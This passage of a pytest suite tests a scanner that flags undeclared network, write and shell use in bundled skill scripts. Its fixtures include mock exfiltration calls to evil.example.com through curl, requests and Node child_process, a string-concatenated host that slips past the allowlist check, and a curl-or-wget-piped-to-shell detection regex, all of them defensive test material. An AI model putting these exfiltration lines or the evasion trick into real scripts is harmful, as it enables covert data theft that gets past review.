    tmp_path: pathlib.Path, capsys: pytest.CaptureFixture[str]
) -> None:
    """No monkeypatching -- proves the CLI wiring (argument parsing ->
    find_skill_drift -> exit code) works end to end, not just that main()
    correctly reacts to a mocked find_skill_drift."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
    )
    _write_sidecar(skill_dir, {"network_mode": "disabled", "write_tags": [], "shell_tags": []})

    exit_code = scanner.main([str(skill_dir)])

    assert exit_code == 1
    captured = capsys.readouterr()
    assert "tools-write-vs-skill-md" in captured.out


# ---- missing PyYAML dependency (issue #1076) ----


def test_missing_pyyaml_exits_with_clear_message_not_a_traceback(
    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """Issue #1076: this module's own top-level `import yaml` used to be
    unguarded, so a surface without the dev dependency group installed
    (pyproject.toml declares PyYAML only under `[dependency-groups] dev`,
    never a root `dependencies` entry) raised a raw, unhandled
    ModuleNotFoundError with no actionable next step. Simulates that
    surface without a real PyYAML-less venv: setting `sys.modules["yaml"]
    = None` is CPython's own documented mechanism for making a subsequent
    `import yaml` raise ModuleNotFoundError (see importlib._bootstrap.
    _find_and_load). Runs the script fresh via `runpy.run_path(...,
    run_name="__main__")` rather than `importlib.import_module()`: a
    second /code-review pass live-verified that the guard's SystemExit(2)
    only fires under `__name__ == "__main__"` (see the regression test
    below for why), and run_path is the standard-library way to execute a
    file as if it were `__main__` in-process, without a real subprocess.
    A still-unguarded import would let ModuleNotFoundError itself escape
    `pytest.raises(SystemExit)` uncaught, failing this test loudly rather
    than silently -- the defeat case this test exists to rule out."""
    monkeypatch.setitem(sys.modules, "yaml", None)
    script_path = str(pathlib.Path(scanner.__file__))

    with pytest.raises(SystemExit) as exc_info:
        runpy.run_path(script_path, run_name="__main__")

    assert exc_info.value.code == 2
    stderr = capsys.readouterr().err
    assert "PyYAML" in stderr
    assert "uv sync --group dev" in stderr


def test_missing_pyyaml_on_plain_import_propagates_cleanly_not_systemexit(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Regression test for a bug a second /code-review pass caught before
    merge (issue #1076): the guard originally converted a missing PyYAML
    into SystemExit(2) unconditionally, including when this module is
    merely *imported* rather than run as a script. Live-verified in an
    isolated PyYAML-less venv: pytest *collecting* this file's own
    `import ... as scanner` line with that unconditional guard produced
    INTERNALERROR (exit 3, "caught unexpected SystemExit") instead of the
    clean "ERROR collecting" report (exit 2) the pre-#1076 unguarded
    `import yaml` produced -- a strictly worse failure mode in exactly the
    environment this guard exists to help. Asserts the fix: a plain
    import with PyYAML missing must let ModuleNotFoundError itself
    propagate, matching pre-#1076 behavior, not be converted to
    SystemExit -- reusing the already-imported `scanner` object here
    would skip the guard entirely and let this test pass vacuously, so
    this evicts the cached module first to force a fresh top-level exec,
    the same way the CLI-path test above does."""
    module_name = "gitapex_scan_execution_requirements_drift"
    monkeypatch.setitem(sys.modules, "yaml", None)
    monkeypatch.delitem(sys.modules, module_name, raising=False)

    with pytest.raises(ModuleNotFoundError) as exc_info:
        importlib.import_module(module_name)

    assert exc_info.value.name == "yaml"


def test_broken_yaml_installation_error_propagates_unmodified(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Adversarial-review finding on this same guard (issue #1076): a
    ModuleNotFoundError raised from INSIDE an already-found but
    broken/partial PyYAML install (e.g. one of its own internal
    submodules missing) carries error.name == "yaml.<submodule>", not
    "yaml" -- a live probe against a deliberately broken fake `yaml`
    package confirmed this exact shape. This guard's own remediation
    ("install the dev dependency group") would not fix a corrupted
    install, so misreporting it as a plain missing-PyYAML case would send
    a reader chasing the wrong problem. Simulated via builtins.__import__
    patching (distinct from the missing-package test above's
    sys.modules-value-None trick, since there is no single sys.modules
    entry that represents "this package exists but one of its own
    internal imports fails") -- asserts the ORIGINAL ModuleNotFoundError
    propagates uncaught, not converted to this guard's SystemExit(2)."""
    module_name = "gitapex_scan_execution_requirements_drift"
    real_import = builtins.__import__

    def _fake_import(name: str, *args: object, **kwargs: object) -> object:
        if name == "yaml":
            raise ModuleNotFoundError("No module named 'yaml.tokens'", name="yaml.tokens")
        return real_import(name, *args, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(builtins, "__import__", _fake_import)
    monkeypatch.delitem(sys.modules, module_name, raising=False)

    with pytest.raises(ModuleNotFoundError) as exc_info:
        importlib.import_module(module_name)

    assert exc_info.value.name == "yaml.tokens"


# ---- error-path coverage: discover_skill_dirs / _load_sidecar / _spec_of ----


def test_discover_skill_dirs_missing_directory_is_empty(tmp_path: pathlib.Path) -> None:
    assert scanner.discover_skill_dirs(tmp_path / "does-not-exist") == []


def test_load_sidecar_nonexistent_file_raises_read_error(tmp_path: pathlib.Path) -> None:
    with pytest.raises(scanner.ReadError, match="cannot be read"):
        scanner._load_sidecar(tmp_path / "missing.yaml")


def test_load_sidecar_non_utf8_raises_read_error(tmp_path: pathlib.Path) -> None:
    path = tmp_path / "bad-encoding.yaml"
    path.write_bytes(b"\xff\xfe not utf-8")
    with pytest.raises(scanner.ReadError, match="not valid UTF-8"):
        scanner._load_sidecar(path)


def test_load_sidecar_invalid_yaml_raises_read_error(tmp_path: pathlib.Path) -> None:
    path = tmp_path / "bad.yaml"
    path.write_text("key: [unclosed\n", encoding="utf-8")
    with pytest.raises(scanner.ReadError, match="not valid YAML"):
        scanner._load_sidecar(path)


def test_load_sidecar_deeply_nested_yaml_raises_read_error(tmp_path: pathlib.Path) -> None:
    # Regression pin: RecursionError is not a yaml.YAMLError subclass, so a
    # deeply nested flow-sequence sidecar used to propagate an uncaught
    # RecursionError straight out of _load_sidecar, crashing the whole scan
    # instead of reporting one clean ReadError the way every other
    # malformed-input case here does -- the same bug this module's own
    # sibling, gitapex_scan_skill_metadata_schema.py's load_sidecar,
    # already fixed, that this duplicated copy had not carried forward.
    path = tmp_path / "deep.yaml"
    path.write_text("key: " + "[" * 3000 + "]" * 3000, encoding="utf-8")
    with pytest.raises(scanner.ReadError, match="too deeply nested"):
        scanner._load_sidecar(path)


def test_read_text_best_effort_on_directory_returns_empty(tmp_path: pathlib.Path) -> None:
    directory = tmp_path / "a-directory"
    directory.mkdir()
    assert scanner._read_text_best_effort(directory) == ""


def test_spec_of_non_dict_instance_is_empty() -> None:
    assert scanner._spec_of(["not", "a", "dict"]) == {}


def test_find_drift_invalid_yaml_sidecar_is_error(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text("key: [unclosed\n", encoding="utf-8")

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    assert _severities(findings) == ["error"]
    assert "not valid YAML" in findings[0].message


def test_find_drift_non_dict_execution_requirements_is_tolerated(tmp_path: pathlib.Path) -> None:
    skill_dir = _make_skill(tmp_path)
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text(
        "apiVersion: gitapex.io/v1alpha1\n"
        "kind: SkillMetadata\n"
        f"metadata:\n  name: {skill_dir.name}\n"
        "spec:\n"
        "  executionRequirements: not-a-mapping\n",
        encoding="utf-8",
    )

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    assert findings == []


# ---- defeat tests: adversarially probing the detection logic itself,
# not just its happy path (evaluating-deterministic-gate-quality dimension
# 15's own instruction: "independently construct and run a malformed,
# boundary, or missing-dependency input directly against the gate before
# crediting this dimension") ----


def test_malformed_execution_requirements_still_fail_closed_on_real_usage(tmp_path: pathlib.Path) -> None:
    """Dimension 15 proof: a garbage (non-mapping) executionRequirements
    value must NOT silently read as "nothing to check" when the skill's
    real content actually performs the capability that would have been
    gated -- it must fall back to the strictest defaults (network
    'disabled', tools not declared) and still flag the real usage as an
    error, not silently pass because the declaration itself was malformed."""
    skill_dir = _make_skill(
        tmp_path,
        skill_md="# Example\n\n## Steps\n\n1. Creates a new file for the fixture.\n",
        scripts={"fetch.py": "import urllib.request\n"},
    )
    metadata_dir = skill_dir / "metadata"
    metadata_dir.mkdir()
    (metadata_dir / "gitapex.yaml").write_text(
        "apiVersion: gitapex.io/v1alpha1\n"
        "kind: SkillMetadata\n"
        f"metadata:\n  name: {skill_dir.name}\n"
        "spec:\n"
        "  executionRequirements: [1, 2, 3]\n",
        encoding="utf-8",
    )

    findings = scanner.find_drift(skills_dir=tmp_path, min_expected_skill_dirs=1)

    messages = [f.message for f in findings]
    assert any("network-mode-vs-script-content" in m for m in messages)
    assert any("tools-write-vs-skill-md" in m for m in messages)
    assert all(f.severity == "error" for f in findings)


def test_dynamically_constructed_host_evades_allowlist_check(tmp_path: pathlib.Path) -> None:
    """Attempted evasion of the allowlist out-of-list-host check: a host
    built at runtime from string concatenation, rather than appearing as a
    literal https?://host substring, is genuinely invisible to
    _URL_HOST_PATTERN's regex-only matching. This is NOT a passing
    detection -- it is the documented false-negative limitation
    (module docstring: "a network call routed through an unlisted helper,
    or dynamic/reflective invocation, can still slip through undetected")
    proven concretely rather than only asserted in prose. If a future
    change to find_network_drift starts catching this case, this test's
    own assertion (== []) will fail and must be updated deliberately, not
    silently -- it is not a regression to fix quietly."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={"fetch.py": ('import requests\nhost = "evil" + ".example.com"\nrequests.get(f"https://{host}/x")\n')},
    )
    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["github.com"]}, skill_dir)
    assert findings == []


def test_non_python_bundled_scripts_get_heuristic_network_scan(tmp_path: pathlib.Path) -> None:
    """Issue #1079: _bundled_script_trees only globs scripts/*.py, so a
    bundled .sh script making a real, unmistakable network call (curl) used
    to be completely invisible to find_network_drift and silently scored
    clean -- this was previously pinned as the intentional status quo by
    this same test (named test_non_python_bundled_scripts_are_not_scanned,
    asserting == []); the fix corrects that expectation deliberately, not
    silently, per the issue's own requested outcome. The .sh script is now
    caught by the heuristic (kind="heuristic") non-Python lane, alongside
    the equivalent Python script's own pre-existing deterministic catch."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://evil.example.com/exfiltrate\n"})

    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)

    assert len(findings) == 1
    assert findings[0].kind == "heuristic"
    assert "network-command-in-non-python-script" in findings[0].message
    assert "fetch.sh" in findings[0].message

    # Sanity check: the equivalent Python script IS caught too, via the
    # pre-existing deterministic AST lane -- proving this is an added
    # detection path, not a change to the Python-script behavior.
    py_skill_dir = _make_skill(
        tmp_path,
        name="example-skill-py",
        scripts={"fetch.py": 'import requests\nrequests.get("https://evil.example.com/exfiltrate")\n'},
    )
    py_findings = scanner.find_network_drift({"mode": "disabled"}, py_skill_dir)
    assert len(py_findings) == 1
    assert py_findings[0].kind == "deterministic"


def test_benign_non_python_bundled_script_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Negative case for the new heuristic lane (issue #1079): a bundled
    .sh script with no network-capable command must not be flagged, even
    under network.mode: disabled -- guards against a fail-closed-everything
    regression where any non-Python script at all gets scored as drift,
    the exact false-positive cost the issue's own trade-off investigation
    rejected as too high for a zero-content-analysis alternative."""
    skill_dir = _make_skill(tmp_path, scripts={"greet.sh": "#!/bin/bash\necho 'hello from a benign script'\n"})

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_non_python_network_command_does_not_trigger_unrestricted_over_declared_warning(
    tmp_path: pathlib.Path,
) -> None:
    """A skill correctly declaring network.mode: unrestricted with only a
    non-Python (.sh) script performing real network I/O must not be
    penalized with the over-declared warning -- that warning is meant for
    a skill with genuinely no network-capable content of any kind, not one
    whose only evidence happens to live in a language this scanner cannot
    AST-parse."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://example.com/data\n"})

    assert scanner.find_network_drift({"mode": "unrestricted"}, skill_dir) == []


def test_non_python_test_file_is_excluded_from_network_scan(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): the new
    non-Python lane originally had no equivalent of _bundled_script_trees'
    own "test_" prefix exclusion, so a bundled non-Python test/fixture
    script performing a real network call against a mock or local test
    endpoint -- entirely legitimate test-only content, not the skill's own
    shipped capability -- was misattributed as real drift, the identical
    bug this module already fixed once for Python
    (test_bundled_test_file_is_excluded_from_script_content_scanning,
    elsewhere in this file) reappearing for every other language."""
    skill_dir = _make_skill(tmp_path, scripts={"test_fetch.sh": "#!/bin/bash\ncurl https://mock.example.com/x\n"})

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_unreadable_non_python_script_is_undetermined_not_clean(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): a non-UTF-8
    bundled non-Python script used to be silently scored clean (an
    unreadable file contributed no pattern matches), the exact
    assume-clean outcome _bundled_script_trees' own docstring already
    refuses for the parallel unparseable-.py case ("an inability to
    verify is a deny, not an assume-clean"). Now surfaced as its own
    "non-python-script-unreadable" finding, unconditionally (regardless of
    declared network.mode, mirroring network-script-unparseable's own
    unconditional treatment) -- an unreadable file's real content, and
    thus its compliance with any declared mode, is genuinely unknown."""
    skill_dir = _make_skill(tmp_path)
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "fetch.sh").write_bytes(b"#!/bin/bash\n\xff\xfe not valid utf-8\n")

    findings = scanner.find_network_drift({"mode": "disabled"}, skill_dir)

    assert len(findings) == 1
    assert findings[0].severity == "error"
    assert findings[0].kind == "deterministic"
    assert "non-python-script-unreadable" in findings[0].message
    assert "fetch.sh" in findings[0].message


def test_non_python_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079) against this
    repository's own
    skills/executing-a-branch-plan/scripts/check_task_bash_safety.sh: a
    non-Python script that mentions "curl"/"wget" only inside a '#'
    comment (documenting, not performing, a fetch-and-execute pattern) was
    misreported as real network usage -- a false positive the AST lane
    structurally cannot produce, since a real parse tree has no comment
    nodes at all (module docstring). A whole-line comment is now stripped
    before the heuristic pattern runs, closing this specific gap."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "example.sh": (
                "#!/bin/bash\n"
                "# Example: piping curl or wget into a shell interpreter is dangerous.\n"
                "echo 'this script performs no network I/O of its own'\n"
            )
        },
    )

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_non_python_slash_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Found live by a CodeRabbit adversarial review round (issue #1079):
    _SCRIPT_EXTENSIONS includes .js/.mjs/.ts/.php, whose whole-line comment
    marker is '//', not '#' -- a comment-only mention of "curl" in a
    bundled .js script was NOT stripped by the '#'-only pattern and still
    produced a false finding. _strip_line_comments now dispatches on the
    file's own suffix; real (non-comment) usage in the same language must
    still be caught."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "fetch.js": (
                "// Example: piping curl or wget into a shell interpreter is dangerous.\n"
                "console.log('this script performs no network I/O of its own');\n"
            )
        },
    )

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []

    # Sanity check: real (non-comment) usage in the same language IS caught.
    real_skill_dir = _make_skill(
        tmp_path,
        name="example-skill-js",
        scripts={"fetch.js": "require('child_process').exec('curl https://evil.example.com/exfiltrate');\n"},
    )
    assert scanner.find_network_drift({"mode": "disabled"}, real_skill_dir) != []


def test_non_python_batch_comment_only_network_mention_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Same fix as test_non_python_slash_comment_only_network_mention_
    produces_no_finding, for Windows batch (.bat/.cmd) files, whose
    whole-line comment markers are "REM" and "::" -- neither of which the
    '#'/'//' patterns recognize."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "fetch.bat": (
                "REM Example: piping curl or wget is dangerous.\n"
                ":: another comment mentioning wget\n"
                "echo this script performs no network I/O of its own\n"
            )
        },
    )

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_non_python_quoted_network_command_text_still_produces_finding(tmp_path: pathlib.Path) -> None:
    """Disclosed residual limitation (issue #1079), proven concretely
    rather than only asserted in the module docstring: a network-capable
    command name quoted as text inside an unrelated string/regex literal
    on a real (non-comment) code line -- as this repository's own
    check_task_bash_safety.sh's fetch_exec_re variable does, quoting
    "curl|wget" as detection text for its own safety gate, not as an
    invocation -- is NOT excluded by the comment-line stripping fix and
    still produces a finding. This is NOT a passing detection; it is the
    same class of imprecision this module's own SKILL.md prose heuristic
    (_SHELL_INTENT_PATTERN/_WRITE_INTENT_PATTERN) already carries
    unmitigated for negated/quoted/example text, deliberately not chased
    further here. If a future change starts excluding this case, this
    test's own assertion must be updated deliberately, not silently."""
    skill_dir = _make_skill(
        tmp_path,
        scripts={
            "check_safety.sh": (
                '#!/bin/bash\nfetch_exec_re="(curl|wget)[^|]*\\|[[:space:]]*(sh|bash)"\n'
                'if [[ "$cmd" =~ $fetch_exec_re ]]; then echo blocked; fi\n'
            )
        },
    )

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) != []


def test_non_python_allowlist_mode_flags_out_of_list_host(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): the non-Python
    heuristic lane originally only fired for network.mode: disabled, so a
    skill declaring network.mode: allowlist with a non-Python script
    calling an undeclared host was silently scored clean -- exactly the
    "silently scores as clean" failure mode the issue itself exists to
    close, just for a different mode. A literal https?:// host referenced
    in a non-Python bundled script's own text is now checked against the
    declared allowlist domains too, tagged kind="heuristic"."""
    skill_dir = _make_skill(tmp_path, scripts={"fetch.sh": "#!/bin/bash\ncurl https://evil.example.com/exfil\n"})

    findings = scanner.find_network_drift({"mode": "allowlist", "domains": ["example.com"]}, skill_dir)

    assert len(findings) == 1
    assert findings[0].kind == "heuristic"
    assert "network-mode-vs-non-python-script-content" in findings[0].message
    assert "evil.example.com" in findings[0].message

    # A host that IS in the allowlist must not be flagged.
    allowed = _make_skill(
        tmp_path, name="allowed-skill", scripts={"fetch.sh": "#!/bin/bash\ncurl https://example.com/data\n"}
    )
    assert scanner.find_network_drift({"mode": "allowlist", "domains": ["example.com"]}, allowed) == []


def test_non_script_asset_under_scripts_dir_produces_no_finding(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): a bundled
    non-script asset under scripts/ (an image, in this fixture) with no
    script extension and no shebang line used to be misread as an
    unreadable "script" purely because it failed a UTF-8 decode, and
    flagged as undetermined network-capable usage -- even though it was
    never a script this lane should have looked at in the first place.
    _looks_like_bundled_script's extension-or-shebang gate now excludes it
    entirely, the same way a data/fixture file always should have been."""
    skill_dir = _make_skill(tmp_path)
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "diagram.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\xff" * 20)

    assert scanner.find_network_drift({"mode": "disabled"}, skill_dir) == []


def test_looks_like_bundled_script_treats_unopenable_file_as_not_a_script(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """_looks_like_bundled_script's own OSError fallback (an extensionless
    file that cannot even be opened to peek at a shebang -- a permission
    error or a race where the file disappears mid-scan): treated as "not a
    script" rather than raising, mirroring _bundled_script_trees' own
    OSError handling elsewhere in this module. Exercised via monkeypatch
    rather than a real permission-denied file, since this suite may run as
    root (permission checks would not actually fail in that case)."""
    skill_dir = _make_skill(tmp_path)
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "mystery").write_bytes(b"not actually a script")

    def _raise_os_error(self: pathlib.Path, mode: str = "r") -> None:
        raise OSError("simulated unopenable file")

    monkeypatch.setattr(pathlib.Path, "open", _raise_os_error)

    assert scanner._looks_like_bundled_script(scripts_dir / "mystery") is False


def test_unreadable_script_suppresses_unrestricted_over_declared_warning(tmp_path: pathlib.Path) -> None:
    """Found live by an adversarial review (issue #1079): an unreadable
    non-Python script used to produce BOTH the new
    "non-python-script-unreadable" error (content genuinely unknown) AND
    the pre-existing "over-declared" warning (no network usage shown) in
    the same scan under network.mode: unrestricted -- two findings that
    directly contradict each other, since the script's real content is
    undetermined, not verified-clean. The over-declaration warning is now
    suppressed whenever any script (Python or non-Python) could not be
    read/parsed at all."""
    skill_dir = _make_skill(tmp_path)
    scripts_dir = skill_dir / "scripts"
    scripts_dir.mkdir()
    (scripts_dir / "mystery.sh").write_bytes(b"#!\xff\xfe not valid utf-8\n")

    findings = scanner.find_network_drift({"mode": "unrestricted"}, skill_dir)

    assert len(findings) == 1
    assert "non-python-script-unreadable" in findings[0].message
    assert not any("over-declared" in f.message for f in findings)


# ---- real-repository smoke test ----


def test_real_repository_scan_runs_without_raising() -> None:
    """Deliberately NOT asserting == [] -- see module docstring: issue
    #1022's own Non-goals excludes the retroactive sweep that would be
    needed to make the real repository clean under this scanner today.
    This test only proves find_drift() executes end-to-end against the
    real tree without an unhandled exception."""
    findings = scanner.find_drift()
    assert isinstance(findings, list)
    assert all(isinstance(f, scanner.Finding) for f in findings)
    # A skill-discovery-floor finding means discovery itself failed, in
    # which case every assertion above passes vacuously without the scan
    # having read a single real skill -- found by an independent review.
    assert not any("skill-discovery-floor" in f.message for f in findings)
